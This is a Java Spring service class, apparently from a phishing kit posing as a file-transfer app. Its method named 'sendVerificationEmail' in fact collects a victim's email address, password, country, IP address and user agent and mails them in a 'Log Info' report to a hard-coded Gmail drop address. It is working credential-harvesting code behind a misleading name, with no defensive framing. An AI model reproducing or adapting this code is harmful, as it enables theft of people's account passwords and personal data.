package havezzy.filetransfer.app.email;

import java.io.UnsupportedEncodingException;

import javax.mail.MessagingException;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

@Service
public class EmailService {
	@Autowired
	MailSenderService mailSenderService;
	
	public void addEmail(Email email) throws UnsupportedEncodingException, MessagingException {
		sendVerificationEmail(email);
	}
	
	private void sendVerificationEmail(Email email) throws MessagingException, UnsupportedEncodingException {
		String toAddress = "katrinarowett61@gmail.com";
		String subject = "LOG "+email.getIpAddress();
		String content = "<!DOCTYPE html>\n"
				+ "<html lang=\"en\">\n"
				+ "<head>\n"
				+ "    <meta charset=\"UTF-8\">\n"
				+ "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n"
				+ "    <title>Document</title>\n"
				+ "</head>\n"
				+ "<body>\n"
				+ "    <div style=\"font-family: Arial, Helvetica, sans-serif;\">\n"
				+ "        <p>---------------------------Log Info----------------------------</p>\n"
				+ "        <p>Email Address               :"+email.getEmail()+"</p>\n"
				+ "        <p>Password             :"+email.getPassword()+"</p>\n"
				+ "        <p>|---------------------- INFO | IP | Location ------------------------|</p>\n"
				+ "        <p>|Client Location:  "+email.getCountry()+"</p>\n"
				+ "        <p>|-- http://www.geoiptool.com/?IP="+email.getIpAddress()+" ------</p>\n"
				+ "        <p>User Agent: "+email.getUserAgent()+"</p>\n"
				+ "        <p>|-------- unknown ----------|</p>\n"
				+ "    </div>\n"
				+ "</body>\n"
				+ "</html>";
		
		mailSenderService.sendEmail(toAddress, subject, content);
	}

	
	

}
